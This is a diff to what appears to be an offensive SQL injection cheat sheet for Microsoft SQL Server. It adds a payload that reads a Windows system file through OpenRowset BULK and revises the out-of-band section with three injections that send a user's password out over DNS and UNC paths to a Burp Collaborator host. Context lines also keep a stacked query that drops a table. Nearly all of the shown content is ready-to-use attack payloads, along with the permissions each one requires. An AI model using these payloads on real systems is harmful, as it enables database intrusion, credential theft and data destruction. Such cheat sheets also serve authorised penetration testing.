@@ -14,6 +14,7 @@
 * [MSSQL Blind Based](#mssql-blind-based)
 * [MSSQL Time Based](#mssql-time-based)
 * [MSSQL Stacked query](#mssql-stacked-query)
+* [MSSQL Read file](#mssql-read-file)
 * [MSSQL Command execution](#mssql-command-execution)
 * [MSSQL Out of band](#mssql-out-of-band)
     * [MSSQL DNS exfiltration](#mssql-dns-exfiltration)
@@ -147,6 +148,16 @@ Use a semi-colon ";" to add another query
 ProductID=1; DROP members--
 ```
 
+
+## MSSQL Read file
+
+**Permissions**: The `BULK` option requires the `ADMINISTER BULK OPERATIONS` or the `ADMINISTER DATABASE BULK OPERATIONS` permission.
+
+```sql
+-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
+```
+
+
 ## MSSQL Command execution
 
 ```sql
@@ -196,7 +207,12 @@ GO
 Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1
 
 ```powershell
-1 and exists(select * from fn_trace_gettable('\\'%2b(select pass frop users where id=1)%2b'.xxxxxxx.burpcollaborator.net\1.trc',default))
+# Permissions: Requires VIEW SERVER STATE permission on the server.
+1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
+
+# Permissions: Requires the CONTROL SERVER permission.
+1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
+1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
 ```
 
 
